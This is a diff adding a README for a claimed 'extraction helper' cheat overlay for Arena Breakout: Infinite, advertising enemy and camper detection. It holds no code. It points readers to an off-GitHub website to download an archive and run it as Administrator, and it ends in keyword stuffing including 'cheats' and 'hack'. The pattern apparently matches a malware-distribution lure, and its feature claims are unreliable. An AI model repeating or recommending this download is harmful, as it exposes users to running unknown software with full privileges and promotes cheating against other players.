@@ -1,0 +1,101 @@
+# 🚁 Arena Breakout Extraction Helper — Raid Exit Assistant
+
+[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://emerune.gamer.gd/)
+[![Version](https://img.shields.io/badge/version-3.8.0-gold)](https://emerune.gamer.gd/)
+[![Platform](https://img.shields.io/badge/platform-Windows-blue)](https://emerune.gamer.gd/)
+[![Download](https://img.shields.io/badge/download-here-orange)](https://emerune.gamer.gd/)
+
+> **Arena Breakout Extraction Helper** is an external raid exit assistant designed to help you survive and extract safely.  
+> It provides real-time extraction zone tracking, camper detection, timer alerts, and safe route suggestions — so you never lose your loot again.
+
+---
+
+## ✨ Key Features
+
+| Category | Features |
+|----------|----------|
+| **🚁 Extraction Zones** | Live status (open/closed), countdown timers, and proximity alerts |
+| **👀 Camper Detection** | Warns if enemies are camping near extraction points |
+| **🗺️ Safe Pathing** | Suggests the safest route to extract based on enemy density |
+| **📦 Loot Protection** | Prioritize extracting with your most valuable items |
+| **🔄 Team Sync** | Share extraction status with your squad (optional) |
+| **🛡️ Safety** | External-only — no injection, no memory access, fully portable |
+
+---
+
+## 🎮 How to Use
+
+1. **Download** the setup assistant from our official channel
+2. **Extract** the archive using 7-Zip or WinRAR
+3. **Run** as Administrator
+4. **Launch** Arena Breakout: Infinite
+5. **Enable** extraction helper overlay
+6. **Get alerts** when extraction zones open or when campers are detected
+7. **Follow** the suggested safe path to exit
+
+---
+
+## 🛡️ Why Choose This Extraction Tool?
+
+| Benefit | Description |
+|---------|-------------|
+| **Safe Extraction** | Never lose your loot again — know exactly when and where to extract |
+| **Camper Alerts** | Avoid ambushes at extraction points |
+| **Timer Alerts** | Get notified when extraction zones are about to close |
+| **Path Suggestions** | Choose the safest route based on enemy positions |
+| **Lightweight** | Minimal CPU/GPU usage — no impact on game performance |
+| **Free** | No subscription, no premium tiers |
+
+---
+
+## 📊 Status
+
+| Metric | Value |
+|--------|-------|
+| **Status** | 🟢 ONLINE |
+| **Last Update** | 2026-07-07 |
+| **Modules** | 48 / 48 active |
+| **Build** | v3.8.0 |
+| **Compatibility** | Windows 10 / 11 |
+
+---
+
+## 📦 Download
+
+> **The tool is not hosted on GitHub.**  
+> All builds are distributed through our official channel.
+
+🔗 **Official Website:** [https://emerune.gamer.gd/](https://emerune.gamer.gd/)
+
+---
+
+## 🔍 What You Get
+
+- **Real-time extraction tracking** — never miss an extraction window
+- **Campers detection** — stay safe from ambushes
+- **Countdown timers** — know exactly when extraction closes
+- **Safe route suggestions** — avoid conflict zones
+- **Team sync** — coordinate extraction with your squad
+- **Portable** — no installation required
+
+---
+
+## 🔑 SEO Keywords
+
+arena breakout extraction helper, arena breakout extraction tool, arena breakout extraction assistant, arena breakout exit guide, arena breakout extraction tracker, arena breakout camper detection, arena breakout safe extraction, arena breakout raid assistant, arena breakout survival tool, arena breakout extraction radar, arena breakout extract helper, arena breakout extraction zone, arena breakout timer, arena breakout extract, arena breakout cheats, arena breakout hack, arena breakout tool, abi extraction, abi exit helper
+
+---
+
+## About
+
+Arena Breakout Extraction Helper is an external raid exit assistant designed for Arena Breakout: Infinite. It provides real-time extraction zone tracking, camper detection, timer alerts, and safe route suggestions — so you never lose your loot again.
+
+---
+
+## 🛡️ Disclaimer
+
+This is an unofficial extraction helper tool for Arena Breakout: Infinite. It is not affiliated with, endorsed by, or sponsored by the game's developer or publisher. All game trademarks belong to their respective owners. Use at your own discretion.
+
+---
+
+*© 2026 EMERUNE*
